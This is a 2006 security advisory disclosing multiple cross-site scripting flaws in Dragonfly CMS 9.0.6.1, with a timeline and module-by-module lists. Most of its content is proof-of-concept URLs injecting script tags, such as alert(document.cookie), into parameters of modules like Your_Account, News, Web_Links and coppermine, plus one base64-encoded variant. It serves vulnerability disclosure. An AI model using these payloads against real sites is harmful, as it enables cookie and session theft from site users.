######################################################
Multiple Cross site scripting in dragonflycms 9.0.6.1
Vendor url:http://dragonflycms.org/
Advisore: http://lostmon.blogspot.com/2006/02/
multiple-cross-site-scripting-in.html
Vendor notify: exploit available: yes
######################################################

Description:

"Dragonfly CMS is a powerful, feature-rich, Open Source
content management system (CMS) based on PHP-Nuke 6.5.
We have spent over a year developing Dragonfly CMS,
paying close attention to security and reliability. The
release of Dragonfly marks yet another exciting milestone
in our history."

CPG Dragonfly is vulnerable to cross site scripting that
allow attackers to steal information from users by adding
JavaScript code via some of the parameters used by the CMS
product.



######################
Versions
######################

prior to Dragonfly 9.0.6.1

#########################
Solution
########################

No solution was available at this time.

##########################
Timeline
##########################

discovered:12-02-2006
vendor notify:20-02-2006 (web form "contact us")
vendor response:---------
disclosure:22-02-2006


#############################
XSS in module 'Your_Account'
#############################

http://[Victim]/index.php?name=Your_Account&error=1
&uname=bGFsYWxh"><script>alert(document.cookie)
</script>

http://[Victim]/index.php?name=Your_Account&error=1
"><script>alert(document.cookie)</script>
&uname=bGFsYWxh

http://[Victim]/index.php?name=Your_Account&profile=3
"><script>alert(document.cookie)</script>


http://[Victim]/index.php?name=Your_Account&error=1&uname=
PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+


this PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+
is this "><script>alert(document.cookie)</script>
base64 cross site scripting , the XSS code are encoded in base64.

the username field are vulnerable too
insert in the box <script>alert()</script>
and this code is executed...

#######################
XSS in module 'News'
#######################

http://[Victim]/index.php?name=News&catid=1"><script>alert()</script>

http://[Victim]/index.php?name=News&file=article&sid=7"><script>alert()</script>

http://[Victim]/index.php?name=News&file=submit

// texareas 'Story Text' and Extended text are vulnerables.

http://[Victim]/index.php?name=News&file=friend&sid=5"><script>alert()</script>


#################################
XSS in module 'Stories_Archive'
#################################

http://[Victim]/index.php?name=Stories_Archive&sa=show_month
&year=2005&month=11"><script>alert()</script>

http://[Victim]/index.php?name=Stories_Archive&sa=show_month
&year=2005"><script>alert()</script>
>&month=11

http://[Victim]/index.php?name=Stories_Archive&sa=show_all
"><script>alert()</script>

###########################
XSS in module 'Web_Links'
###########################

http://[Victim]/index.php?name=Web_Links&l_op=viewlink
&cid=15&min=10&orderby=title%20ASC&show=0"><script>alert
(document.cookie)</script>

http://[Victim]/index.php?name=Web_Links&l_op=viewlink
&cid=15"><script>alert()</script>

http://[Victim]/index.php?name=Web_Links&l_op=toprated
&ratenum=5&ratetype=percent"><script>alert()</script>

http://[Victim]/index.php?name=Web_Links&l_op=viewlink&cid=15
&orderby=titled"><script>alert()</script>


###########################
XSS in module 'Surveys'
###########################

http://[Victim]/index.php?name=Surveys&op=results
"><script>alert()</script>pollid=3

http://[Victim]/index.php?name=Surveys&op=results&pollid=5
"><script>alert()</script>

###########################
XSS in module 'Downloads'
###########################

http://[Victim]/index.php?name=Downloads&c=1"><script>alert()</script>

###########################
XSS in module 'coppermine'
###########################

http://[Victim]/coppermine/thumbnails/meta=">
<script>alert()</script>
topn/album=1.html

http://[Victim]/coppermine/thumbnails/metatopn/album=1.html
"><script>alert()</script>

http://[Victim]/index.php?name=coppermine&file=thumbnails&album=1
"><script>alert()</script>


############################
XSS in module -Search-
############################

http://[Victim]/index.php?name=Search

User input passed to the search box in the following
modules is not sanitised before being returned to users:

Search
Stories_Archive
Downloads
Topics

if we insert in the search box this code "><script>alert()</script>
this is executed wen we click in Search button.

####################### €nd ############################

Thns to estrella to be my ligth
--
atentamente:
Lostmon (lostmon@gmail.com)
Web-Blog: http://lostmon.blogspot.com/
--
La curiosidad es lo que hace mover la mente....
